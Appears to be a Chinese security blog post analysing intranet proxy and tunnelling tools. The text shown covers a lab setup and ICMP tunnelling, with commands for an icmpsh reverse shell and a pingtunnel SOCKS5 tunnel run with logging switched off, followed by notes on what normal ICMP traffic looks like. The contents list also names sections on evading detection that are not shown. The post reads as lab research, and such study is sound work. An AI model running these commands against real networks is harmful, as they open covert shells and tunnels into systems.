<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207160054406.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207165820468.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207165802108.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207165713749.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207234557467.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220207235941114.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208000009857.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208000047328.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208183919257.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208184104328.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205183254355.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205185013518.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205205903524.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208113611284.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208152703880.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208113452941.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208113517879.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208132131095.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208152831354.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208160524451.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208161350258.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208203112314.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208203158361.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208213244172.png">
<meta property="og:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220208215056422.png">
<meta property="article:published_time" content="2022-02-03T07:09:12.000Z">
<meta property="article:modified_time" content="2022-02-08T13:54:45.699Z">
<meta property="article:author" content="Rj45mp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203155808673.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/Rj45mp.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/Rj45mp.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/Rj45mp.jpg">
        
      
    
    <!-- title -->
    <title>内网代理和穿透工具的分析记录</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/firends/">Firends</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2021-Rj45mp-%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&text=内网代理和穿透工具的分析记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=内网代理和穿透工具的分析记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&is_video=false&description=内网代理和穿透工具的分析记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=内网代理和穿透工具的分析记录&body=Check out this article: https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=内网代理和穿透工具的分析记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=内网代理和穿透工具的分析记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=内网代理和穿透工具的分析记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=内网代理和穿透工具的分析记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&name=内网代理和穿透工具的分析记录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&t=内网代理和穿透工具的分析记录"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">0x01 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">0x02 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81ICMP%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.1.</span> <span class="toc-text">1、ICMP隧道技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81ICMP%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">3.2.</span> <span class="toc-text">2、ICMP隧道流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81TCP%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.3.</span> <span class="toc-text">3、TCP隧道技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81TCP%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">3.4.</span> <span class="toc-text">4、TCP隧道流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81UDP%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.5.</span> <span class="toc-text">5、UDP隧道技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81UDP%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">3.6.</span> <span class="toc-text">6、UDP隧道流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E3%80%81DNS%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.7.</span> <span class="toc-text">7、DNS隧道技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E3%80%81DNS%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">3.8.</span> <span class="toc-text">8、DNS隧道流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9%E3%80%81SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.9.</span> <span class="toc-text">9、SSH隧道技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10%E3%80%81SSH%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">3.10.</span> <span class="toc-text">10、SSH隧道流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11%E3%80%81HTTP%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.11.</span> <span class="toc-text">11、HTTP隧道技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12%E3%80%81HTTP%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">3.12.</span> <span class="toc-text">12、HTTP隧道流量特征</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">0x03 检测与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%A3%80%E6%B5%8B"><span class="toc-number">4.1.</span> <span class="toc-text">1、检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E9%98%B2%E5%BE%A1"><span class="toc-number">4.2.</span> <span class="toc-text">2、防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%94%B9%E9%80%A0"><span class="toc-number">5.</span> <span class="toc-text">0x04 改造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81frp%E6%94%B9%E9%80%A0"><span class="toc-number">5.1.</span> <span class="toc-text">1、frp改造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%BB%93%E6%9E%84%E7%89%B9%E5%BE%81"><span class="toc-number">5.1.1.</span> <span class="toc-text">修改结构特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E5%8A%A0%E5%AF%86salt"><span class="toc-number">5.1.2.</span> <span class="toc-text">修改默认加密salt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9Tls%E5%8D%8F%E8%AE%AE0x17%E7%89%B9%E5%BE%81"><span class="toc-number">5.1.3.</span> <span class="toc-text">修改Tls协议0x17特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%87%AA%E5%88%A0%E9%99%A4"><span class="toc-number">5.1.4.</span> <span class="toc-text">配置文件自删除</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81Venom%E6%94%B9%E9%80%A0"><span class="toc-number">5.2.</span> <span class="toc-text">2、Venom改造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">0x05 参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        内网代理和穿透工具的分析记录
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Rj45mp</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-02-03T07:09:12.000Z" itemprop="datePublished">2022-02-03</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>记录一下对内网代理和穿透工具的分析过程，着重在流量侧。</p>
<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><p>攻击机器：192.168.1.131和192.168.1.133</p>
<p>目标机器：192.168.1.137 </p>
<p>目标机器为双网卡，第二层网段为192.168.3.0</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203155808673.png" alt="image-20220203155808673"></p>
<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>思路：网络层 -&gt; 传输层 -&gt; 应用层</p>
<h3 id="1、ICMP隧道技术"><a href="#1、ICMP隧道技术" class="headerlink" title="1、ICMP隧道技术"></a>1、ICMP隧道技术</h3><p><strong>icmpsh</strong></p>
<ul>
<li><p>介绍</p>
<p>icmpsh是一个简单的反向ICMP shell工具。与其他类似的开源工具相比，主要优势在于它不需要管理权限即可在目标机器上运行。<br>客户端只能在Windows机器运行，服务端可以在任何平台上运行。</p>
</li>
<li><p>下载</p>
<p><a target="_blank" rel="noopener" href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
</li>
<li><p>使用</p>
</li>
</ul>
<p>服务端：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/inquisb/icmpsh.git</span><br><span class="line"></span><br><span class="line">#关闭icmp回复,如果要开启icmp回复，该值设置为0</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br><span class="line"></span><br><span class="line">#运行，第一个IP是VPS的eth0网卡IP，第二个IP是目标机器出口的公网IP</span><br><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">python2 get-pip.py</span><br><span class="line">python2 -m pip install impacket</span><br><span class="line">python2 icmpsh_m.py 192.168.1.133 192.168.1.137</span><br></pre></td></tr></table></figure>



<p>客户端：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-t 主机ip地址以发送ping请求。这个选项是强制性的！</span><br><span class="line">-r 发送一个包含字符串“Test1234”的测试icmp请求，然后退出。</span><br><span class="line">-d 毫秒请求之间的延迟（毫秒）</span><br><span class="line">-o 毫秒响应超时（毫秒）。如果没有及时收到回复，从机将增加空白计数器。如果该计数器达到某个极限，从机将退出。如果收到响应，计数器将设置回0。</span><br><span class="line">-b 空白数量限制（退出前未答复的icmp请求）</span><br><span class="line">-s 字节最大数据缓冲区大小（字节）</span><br><span class="line"></span><br><span class="line">icmpsh.exe -t 192.168.1.133 -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure>



<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203174936412.png" alt="image-20220203174936412"></p>
<p><strong>pingtunnel</strong></p>
<ul>
<li><p>介绍</p>
<p>Pingtunnel 是一种通过 ICMP 发送 TCP&#x2F;UDP 流量的工具。其是最流行的一款ICMP代理工具，提供对tcp&#x2F;udp&#x2F;sock5流量伪装成icmp流量进行转发的功能。需要root或者administrator&#x2F;system权限。</p>
</li>
<li><p>下载</p>
<p><a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
</li>
<li><p>使用</p>
</li>
</ul>
<p>高权限条件下</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203183416112.png" alt="image-20220203183416112"></p>
<p>构建反向代理</p>
<p>1）服务端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-type server 代表开启ICMP SERVER端，等待客户端进行连接与通信。</span><br><span class="line">-noprint 1 不在控制台打印日志</span><br><span class="line">-nolog 1 不存储日志文件</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line"></span><br><span class="line">./pingtunnel -type server -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>



<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203205320732.png" alt="image-20220203205320732"></p>
<p>2）客户端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l :4455 -s 192.168.1.133 -sock5 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>



<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203205238445.png" alt="image-20220203205238445"></p>
<p>3）测试使用</p>
<p>设置 socks5</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203205403724.png" alt="image-20220203205403724"></p>
<p>访问二层网络</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203205430525.png" alt="image-20220203205430525"></p>
<h3 id="2、ICMP隧道流量特征"><a href="#2、ICMP隧道流量特征" class="headerlink" title="2、ICMP隧道流量特征"></a>2、ICMP隧道流量特征</h3><p>正常情况下，单位时间内数据包发送的数量为一组。</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203215038175.png" alt="image-20220203215038175"></p>
<p>单组数据包Data字段长度，Windows为32 bytes，Linux下为48 bytes，并且请求包和响应包长度相同。</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203220429657.png" alt="image-20220203220429657"></p>
<p>单组数据包Data字段内容中，Windows为<code>abcdefghijklmnopqrstuvwabcdefghi</code>，Linux下为<code>!”#$%&amp;’()+,-./01234567</code>。</p>
